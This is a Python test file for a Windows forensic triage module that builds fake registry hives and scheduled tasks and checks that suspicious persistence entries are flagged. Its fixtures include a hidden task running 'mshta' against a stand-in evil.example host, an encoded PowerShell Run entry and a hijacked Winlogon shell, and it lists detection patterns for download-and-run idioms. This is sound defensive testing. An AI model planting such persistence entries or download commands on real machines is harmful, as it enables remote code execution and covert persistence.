import json
import os
import shutil
import sys
import tempfile
import unittest
from types import SimpleNamespace
from unittest import mock

from recoverykit.core import case as case_mod
from recoverykit.core.context import RegView
from recoverykit.modules import triage
from recoverykit.modules.triage import (F_APPINIT, F_BOOTDRV, F_BOOTEXEC, F_ENCODED, F_HIDDEN, F_IFEO, F_LOLBIN,
                                        F_MISSING, F_UNPARSEABLE, F_WINLOGON, F_WRITABLE, exists_on_target, flags_for)
from tests.fakewin import dword, make_hive, multi, sz

TASK_TMPL = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<RegistrationInfo><Author>%(author)s</Author></RegistrationInfo>
<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><TimeTrigger/></Triggers>
<Principals><Principal id="A"><UserId>S-1-5-18</UserId></Principal></Principals>
<Settings><Enabled>true</Enabled><Hidden>%(hidden)s</Hidden></Settings>
<Actions Context="A"><Exec><Command>%(cmd)s</Command><Arguments>%(args)s</Arguments></Exec></Actions>
</Task>
"""


def build(paths):
    """{"A\\B": {values}} -> nested hive tree (a path with no values still creates its keys)."""
    tree = {}
    for path, vals in paths.items():
        node = tree
        for part in path.split("\\"):
            node = node.setdefault("keys", {}).setdefault(part, {})
        if vals:
            node.setdefault("values", {}).update(vals)
    return tree


class UI:
    def __init__(self):
        self.lines = []

    def say(self, text=""):
        self.lines.append(text)


class TriageBase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.root = os.path.join(self.tmp, "target") + "\\"
        self.windir = self.root + "Windows"
        self.case = case_mod.Case(os.path.join(self.tmp, "out"))
        self.addCleanup(self.case.close)
        self.ui = UI()

    def write(self, path, data=b"x"):
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as f:
            f.write(data)

    def ctx(self, target=True, online=False):
        t = SimpleNamespace(root=self.root, windir=self.windir, online=online,
                            reg=RegView(self.windir, online=online)) if target else None
        if t:
            self.addCleanup(t.reg.close)
        return SimpleNamespace(case=self.case, ui=self.ui, target=t)

    def sec(self, name):
        return self.case.data["sections"][name]

    def json(self, name):
        with open(self.case.path("inventory", name), encoding="utf-8") as f:
            return json.load(f)


class FlagRules(unittest.TestCase):
    def test_user_writable(self):
        for c in (r"C:\Users\Bob\AppData\Roaming\x.exe", r"C:\Windows\Temp\x.exe", r"C:\Users\Public\x.exe",
                  r"C:\ProgramData\Evil\x.exe", r"C:\Users\Bob\Downloads\x.exe", r"C:\$Recycle.Bin\S-1\x.exe"):
            self.assertIn(F_WRITABLE, flags_for(c), c)
        self.assertNotIn(F_WRITABLE, flags_for(r"C:\Program Files\App\x.exe"))
        self.assertNotIn(F_WRITABLE, flags_for(r'"C:\ProgramData\Microsoft\Windows Defender\Platform\1\MsMpEng.exe"'))

    def test_lolbin(self):
        for c in ("powershell.exe -x", r'"C:\Windows\System32\cmd.exe" /c a', "mshta http://a/b", r"C:\x\RunDLL32.EXE a.dll,F",
                  "certutil -urlcache"):
            self.assertIn(F_LOLBIN, flags_for(c), c)
        self.assertNotIn(F_LOLBIN, flags_for(r"C:\Windows\system32\svchost.exe -k netsvcs"))
        self.assertNotIn(F_LOLBIN, flags_for(r"C:\Tools\notcmd.exe"))

    def test_encoded(self):
        for c in ("powershell -EncodedCommand AAA", "x.exe -enc AAA", "p -c [Convert]::FromBase64String('a')",
                  "p -c (New-Object Net.WebClient).DownloadString('u')", "p -c iex $a", "p -c Invoke-Expression $a",
                  "mshta http://a/b", "x.exe https://a/b"):
            self.assertIn(F_ENCODED, flags_for(c), c)
        self.assertNotIn(F_ENCODED, flags_for(r"C:\Program Files\App\app.exe /silent"))

    def test_empty(self):
        self.assertEqual(flags_for(""), [])
        self.assertEqual(flags_for(None), [])


class ExistsOnTarget(TriageBase):
    def test_mapping(self):
        self.write(self.root + r"Program Files\App\a.exe")
        self.write(self.windir + r"\System32\drivers\good.sys")
        self.write(self.windir + r"\System32\tool.exe")
        f = lambda c: exists_on_target(self.root, self.windir, c)
        self.assertTrue(f(r'"C:\Program Files\App\a.exe" -x'))
        self.assertTrue(f(r"E:\Program Files\App\a.exe /s"))          # any drive letter maps to root
        self.assertFalse(f(r"C:\Program Files\App\missing.exe"))
        self.assertTrue(f(r"%SystemRoot%\System32\tool.exe /a"))
        self.assertTrue(f(r"%windir%\system32\TOOL.exe"))
        self.assertFalse(f(r"%SystemRoot%\system32\nothere.exe"))
        self.assertTrue(f(r"\SystemRoot\System32\drivers\good.sys"))
        self.assertTrue(f(r"system32\drivers\good.sys"))
        self.assertFalse(f(r"system32\drivers\gone.sys"))
        self.assertTrue(f(r"\??\C:\Windows\System32\drivers\good.sys"))
        self.assertTrue(f(r"%ProgramFiles%\App\a.exe"))
        self.assertIsNone(f("notepad.exe"))
        self.assertIsNone(f(r"%UNKNOWN%\x.exe"))
        self.assertIsNone(f(""))

    def test_missing_flag(self):
        self.write(self.root + r"Program Files\App\a.exe")
        ok = triage._flags(self.root, self.windir, r'"C:\Program Files\App\a.exe"')
        gone = triage._flags(self.root, self.windir, r'"C:\Program Files\App\b.exe"')
        self.assertNotIn(F_MISSING, ok)
        self.assertIn(F_MISSING, gone)
        self.assertNotIn(F_MISSING, triage._flags(self.root, self.windir, "notepad.exe"))


class FakeTarget(TriageBase):
    def setUp(self):
        super().setUp()
        cfg = os.path.join(self.windir, "System32", "config")
        run = r"Microsoft\Windows\CurrentVersion\Run"
        wnt = r"Microsoft\Windows NT\CurrentVersion"
        make_hive(os.path.join(cfg, "SOFTWARE"), build({
            run: {"Good": sz(r'"C:\Program Files\Good\good.exe" /bg'),
                  "Bad": sz(r"powershell.exe -enc ZQBjAA== -File C:\Users\Bob\AppData\Roaming\x.ps1")},
            r"Microsoft\Windows\CurrentVersion\RunOnce": {},
            wnt + r"\Winlogon": {"Shell": sz("explorer.exe, evil.exe"),
                                 "Userinit": sz(r"C:\Windows\system32\userinit.exe,")},
            wnt + r"\Windows": {"AppInit_DLLs": sz(r"C:\x\hook.dll")},
            wnt + r"\Image File Execution Options\notepad.exe": {"Debugger": sz(r"C:\Users\Public\dbg.exe")},
            wnt + r"\Image File Execution Options\calc.exe": {},
        }))
        sysd = r"ControlSet001\Services"
        make_hive(os.path.join(cfg, "SYSTEM"), build({
            "Select": {"Current": dword(1)},
            r"ControlSet001\Control\Session Manager": {"BootExecute": multi(["autocheck autochk *", "evil"])},
            sysd + r"\GoodDrv": {"Start": dword(1), "Type": dword(1), "ImagePath": sz(r"\SystemRoot\System32\drivers\good.sys")},
            sysd + r"\AutoSvc": {"Start": dword(2), "Type": dword(16), "ImagePath": sz(r"C:\ProgramData\Evil\svc.exe"),
                                 "DisplayName": sz("Auto Svc"), "ObjectName": sz("LocalSystem")},
            sysd + r"\BootDrv": {"Start": dword(0), "Type": dword(1), "ImagePath": sz(r"\??\C:\Weird\boot.sys")},
            sysd + r"\Manual": {"Start": dword(3), "ImagePath": sz(r"C:\x\m.exe")},
        }))
        self.write(self.windir + r"\System32\drivers\good.sys")
        self.write(self.root + r"Program Files\Good\good.exe")
        make_hive(os.path.join(self.root, "Users", "Bob", "NTUSER.DAT"), build({
            r"Software\Microsoft\Windows\CurrentVersion\Run": {"Updater": sz(r"C:\Users\Bob\AppData\Local\up.exe")}}))
        startup = os.path.join(self.root, "Users", "Bob", "AppData", "Roaming", triage.STARTUP_REL.replace("\\", os.sep))
        self.write(os.path.join(startup, "evil.bat"))
        self.write(os.path.join(startup, "desktop.ini"))
        tasks = os.path.join(self.windir, "System32", "Tasks")
        self.task(os.path.join(tasks, "Microsoft", "Windows", "Foo", "Bar"), "Microsoft", "false", r"%SystemRoot%\system32\foo.exe", "")
        self.task(os.path.join(tasks, "Updater"), "Someone", "true", "mshta.exe", "http://evil.example/a.hta")
        self.write(os.path.join(tasks, "Garbage"), b"\x00\x01 not xml <<<")

    def task(self, path, author, hidden, cmd, args):
        xml = TASK_TMPL % {"author": author, "hidden": hidden, "cmd": cmd, "args": args}
        self.write(path, xml.encode("utf-16"))

    def run_all(self):
        ctx = self.ctx()
        triage.collect(ctx)
        return ctx

    def test_autoruns(self):
        self.run_all()
        s = self.sec("autoruns")
        self.assertEqual(s["status"], "ok")
        ents = self.json("autoruns.json")
        by = {(e["source"], e["name"]): e for e in ents}
        self.assertEqual(by[("HKLM Run", "Good")]["flags"], [])
        bad = by[("HKLM Run", "Bad")]
        for f in (F_LOLBIN, F_ENCODED, F_WRITABLE):
            self.assertIn(f, bad["flags"])
        self.assertIn(F_WINLOGON, by[("Winlogon", "Shell")]["flags"])
        self.assertNotIn(F_WINLOGON, by[("Winlogon", "Userinit")]["flags"])
        self.assertIn(F_APPINIT, by[("Windows", "AppInit_DLLs")]["flags"])
        self.assertIn(F_IFEO, by[("IFEO", "notepad.exe")]["flags"])
        self.assertNotIn(("IFEO", "calc.exe"), by)
        self.assertIn(F_BOOTEXEC, by[("Session Manager", "BootExecute")]["flags"])
        self.assertEqual(sum(1 for e in ents if e["name"] == "BootExecute"), 2)
        self.assertIn(F_WRITABLE, by[("user Bob Run", "Updater")]["flags"])
        self.assertIn(("user Bob Startup", "evil.bat"), by)
        self.assertNotIn("desktop.ini", [e["name"] for e in ents])
        self.assertEqual(s["data"]["count"], len(ents))
        self.assertEqual(len(s["data"]["flagged"]), sum(1 for e in ents if e["flags"]))

    def test_services(self):
        self.run_all()
        self.assertEqual(self.sec("services")["status"], "ok")
        svc = {e["name"]: e for e in self.json("services.json")}
        self.assertEqual(set(svc), {"GoodDrv", "AutoSvc", "BootDrv"})   # Start=3 excluded
        self.assertEqual(svc["GoodDrv"]["flags"], [])
        self.assertIn(F_WRITABLE, svc["AutoSvc"]["flags"])
        self.assertIn(F_MISSING, svc["AutoSvc"]["flags"])
        self.assertNotIn(F_BOOTDRV, svc["AutoSvc"]["flags"])
        self.assertIn(F_BOOTDRV, svc["BootDrv"]["flags"])
        self.assertEqual(svc["AutoSvc"]["object_name"], "LocalSystem")
        self.assertEqual(svc["AutoSvc"]["start"], 2)
        d = self.sec("services")["data"]
        self.assertEqual((d["count"], len(d["flagged"])), (3, 2))

    def test_tasks(self):
        self.run_all()
        s = self.sec("tasks")
        tasks = {e["path"]: e for e in self.json("tasks.json")}
        self.assertEqual(set(tasks), {"Microsoft/Windows/Foo/Bar", "Updater", "Garbage"})
        ms = tasks["Microsoft/Windows/Foo/Bar"]
        self.assertEqual((ms["author"], ms["run_as"], ms["enabled"]), ("Microsoft", "S-1-5-18", True))
        self.assertEqual(ms["triggers"], ["LogonTrigger", "TimeTrigger"])
        self.assertIn(F_MISSING, ms["flags"])
        self.assertNotIn(F_HIDDEN, ms["flags"])   # hidden=false anyway
        up = tasks["Updater"]
        self.assertEqual(up["actions"], ["mshta.exe http://evil.example/a.hta"])
        self.assertTrue(up["hidden"])
        for f in (F_HIDDEN, F_LOLBIN, F_ENCODED):
            self.assertIn(f, up["flags"])
        self.assertIn("error", tasks["Garbage"])
        self.assertEqual(tasks["Garbage"]["flags"], [F_UNPARSEABLE])
        self.assertEqual(s["data"]["count"], 3)
        self.assertEqual(s["data"]["non_microsoft"], 2)
        self.assertEqual(len(s["data"]["flagged"]), 3)

    def test_hidden_microsoft_task_not_flagged_hidden(self):
        self.task(os.path.join(self.windir, "System32", "Tasks", "Microsoft", "H"), "Microsoft", "true", "a.exe", "")
        self.run_all()
        t = {e["path"]: e for e in self.json("tasks.json")}["Microsoft/H"]
        self.assertTrue(t["hidden"])
        self.assertNotIn(F_HIDDEN, t["flags"])

    def test_summary_lines(self):
        self.run_all()
        text = "\n".join(self.ui.lines)
        self.assertIn("  ! HKLM Run/Bad: powershell.exe -enc", text)
        self.assertIn("to look at", text)
        self.assertNotIn("malicious", text.lower())
        for ln in self.ui.lines:
            ln.encode("ascii")

    def test_summary_cap(self):
        many = [{"source": "s", "name": "n%d" % i, "command": "c", "flags": ["f"]} for i in range(45)]
        triage._summary(self.ctx(), {"autoruns": many})
        bang = [ln for ln in self.ui.lines if ln.startswith("  ! ")]
        self.assertEqual(len(bang), 40)
        self.assertIn("  ... 5 more in inventory/*.json", self.ui.lines)

    def test_no_target(self):
        triage.collect(self.ctx(target=False))
        for n in ("autoruns", "services", "tasks"):
            self.assertEqual(self.sec(n)["status"], "skipped")
            self.assertEqual(self.sec(n)["reason"], "no target")

    def test_unreadable_user_hive(self):
        self.write(os.path.join(self.root, "Users", "Locked", "NTUSER.DAT"), b"garbage")
        self.run_all()
        items = {i["name"]: i for i in self.sec("autoruns")["items"]}
        self.assertEqual(items["user Locked"]["status"], "error")
        self.assertEqual(items["user Bob"]["status"], "ok")
        self.assertEqual(self.sec("autoruns")["status"], "ok")
        self.assertIn(("user Bob Run", "Updater"), {(e["source"], e["name"]) for e in self.json("autoruns.json")})

    def test_locked_hive_permission_error(self):
        real = triage.regf.Hive

        def fake(path):
            if "Bob" in path:
                raise PermissionError(13, "The process cannot access the file")
            return real(path)
        with mock.patch.object(triage.regf, "Hive", side_effect=fake):
            self.run_all()
        it = next(i for i in self.sec("autoruns")["items"] if i["name"] == "user Bob")
        self.assertEqual(it["status"], "error")
        self.assertIn("running Windows", it["reason"])
        self.assertGreater(self.sec("autoruns")["data"]["count"], 0)   # the rest was still collected

    def test_missing_tasks_folder(self):
        shutil.rmtree(os.path.join(self.windir, "System32", "Tasks"))
        self.run_all()
        self.assertEqual(self.sec("tasks")["status"], "missing")
        self.assertEqual(self.sec("services")["status"], "ok")

    def test_tasks_permission_error(self):
        with mock.patch.object(triage.os, "scandir", side_effect=PermissionError(13, "Access is denied")):
            ctx = self.ctx()
            with self.case.section("tasks", "Scheduled tasks") as sec:
                triage._tasks(ctx, sec)
        self.assertEqual(self.sec("tasks")["status"], "error")
        self.assertIn("administrator", self.sec("tasks")["reason"])


@unittest.skipUnless(sys.platform == "win32" and os.environ.get("SystemRoot"), "needs a running Windows")
class SmokeOnline(TriageBase):
    def test_running_windows_read_only(self):
        self.root = os.environ.get("SystemDrive", "C:") + "\\"
        self.windir = os.environ["SystemRoot"]
        triage.collect(self.ctx(online=True))
        for n in ("autoruns", "services", "tasks"):
            self.assertIn(self.sec(n)["status"], ("ok", "missing", "error"))
        self.assertNotEqual(self.sec("services")["status"], "skipped")
        self.assertGreater(self.sec("services")["data"]["count"], 0)


if __name__ == "__main__":
    unittest.main()
